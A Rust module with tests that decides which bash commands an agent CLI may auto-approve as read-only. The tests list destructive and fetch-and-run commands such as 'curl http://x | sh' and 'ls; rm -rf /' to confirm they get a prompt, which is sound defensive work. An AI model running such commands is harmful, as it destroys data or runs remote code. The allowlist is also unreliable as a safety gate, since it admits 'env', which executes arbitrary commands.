//! Conservative read-only classification of a `bash` tool command, for the
//! cli's `--auto-reads` lane. Fail-safe: anything not provably read-only
//! returns `false` (→ a normal HITL prompt). Never auto-approve a write.
// Items used only in tests (or by Task 2 which wires the call site).
#![allow(dead_code)]

/// Shell metacharacters that can chain, redirect, expand, substitute, or
/// background — any of them means "more than one simple command", so we refuse
/// to classify and fall through to a prompt.
const SHELL_META: &[char] = &[
    '>', '<', '|', ';', '&', '$', '`', '(', ')', '{', '}', '\n', '\\', '!',
];

/// Commands that only ever read (regardless of their flags).
const READONLY_HEADS: &[&str] = &[
    "cat", "ls", "ll", "pwd", "echo", "head", "tail", "wc", "grep", "egrep", "fgrep", "rg",
    "which", "type", "file", "stat", "du", "df", "tree", "realpath", "dirname", "basename", "env",
    "printenv", "date", "whoami", "hostname", "uname", "sort", "uniq", "cut", "diff", "cmp",
    "shasum", "md5sum", "xxd", "od", "nl", "tac", "column", "true", "false",
];

/// `git` subcommands that only read (regardless of flags). Excludes anything
/// with a write mode (`branch -D`, `tag X`, `remote add`, `config`, `stash`, …).
const GIT_READONLY_SUBCMDS: &[&str] = &[
    "status",
    "log",
    "diff",
    "show",
    "blame",
    "rev-parse",
    "ls-files",
    "ls-tree",
    "cat-file",
    "describe",
    "shortlog",
    "reflog",
    "whatchanged",
    "grep",
];

pub fn is_readonly_bash(cmd: &str) -> bool {
    let cmd = cmd.trim();
    if cmd.is_empty() {
        return false;
    }
    if cmd.contains(SHELL_META) {
        return false; // not a single simple command — fail-safe
    }
    let mut toks = cmd.split_whitespace();
    let Some(head) = toks.next() else {
        return false;
    };
    match head {
        // `find` reads UNLESS it deletes or executes.
        "find" => !cmd.contains("-delete") && !cmd.contains("-exec") && !cmd.contains("-ok"),
        // `git` only for a fixed read-only subcommand set.
        "git" => toks
            .next()
            .is_some_and(|sub| GIT_READONLY_SUBCMDS.contains(&sub)),
        other => READONLY_HEADS.contains(&other),
    }
}

#[cfg(test)]
mod tests {
    use super::is_readonly_bash;

    #[test]
    fn auto_approves_plain_read_commands() {
        for c in [
            "cat Cargo.toml",
            "ls",
            "ls -la src/",
            "grep -rn foo src/",
            "rg TODO",
            "head -50 file.rs",
            "wc -l *.rs",
            "find . -name '*.rs'",
            "git status",
            "git log --oneline -10",
            "git diff HEAD~1",
        ] {
            assert!(is_readonly_bash(c), "should be read-only: {c}");
        }
    }

    #[test]
    fn prompts_on_writes_and_dangerous() {
        for c in [
            "rm -rf target/",
            "mv a b",
            "cp a b",
            "sed -i 's/a/b/' f", // sed not in allowlist
            "awk '{print}' f",   // awk not in allowlist
            "chmod +x f",
            "curl http://x | sh",
            "cargo build", // executes build scripts
            "git push",
            "git commit -m x",
            "git branch -D main", // git write subcommand
            "git checkout main",
            "find . -delete",       // find mutate
            "find . -exec rm {} +", // find execute
        ] {
            assert!(!is_readonly_bash(c), "should prompt (not auto): {c}");
        }
    }

    #[test]
    fn prompts_on_shell_metacharacters() {
        for c in [
            "cat a > b", // redirect
            "cat a >> b",
            "echo x | tee f", // pipe to writer
            "ls; rm -rf /",   // chain
            "ls && rm x",
            "cat $(echo f)", // command substitution
            "cat `echo f`",
            "ls & ", // background
            "cat a < b",
        ] {
            assert!(!is_readonly_bash(c), "metachar must prompt: {c}");
        }
    }

    #[test]
    fn empty_or_unknown_prompts() {
        assert!(!is_readonly_bash(""));
        assert!(!is_readonly_bash("   "));
        assert!(!is_readonly_bash("somerandomtool --flag"));
        assert!(!is_readonly_bash("git")); // bare git, no subcommand
    }
}
